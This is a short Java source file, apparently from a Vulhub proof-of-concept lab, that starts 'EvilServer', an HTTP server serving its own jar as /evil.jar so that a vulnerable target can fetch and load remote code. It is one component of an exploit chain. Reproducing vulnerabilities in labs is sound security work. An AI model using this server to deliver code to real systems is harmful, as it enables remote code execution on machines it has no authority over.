package org.vulhub.poc;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class EvilServer {
    public static void main(String[] args) throws Exception {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8888;
        byte[] jar = Files.readAllBytes(currentJar());
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);
        server.createContext("/evil.jar", exchange -> serveJar(exchange, jar));
        server.start();
        System.out.println("evil.jar server started on port " + port);
        System.out.println("Serving " + currentJar() + " at /evil.jar");
    }

    private static Path currentJar() throws URISyntaxException {
        return Paths.get(EvilServer.class.getProtectionDomain().getCodeSource().getLocation().toURI());
    }

    private static void serveJar(HttpExchange exchange, byte[] jar) throws IOException {
        System.out.println("Serving evil.jar to " + exchange.getRemoteAddress());
        exchange.getResponseHeaders().add("Content-Type", "application/java-archive");
        exchange.sendResponseHeaders(200, jar.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(jar);
        }
    }
}
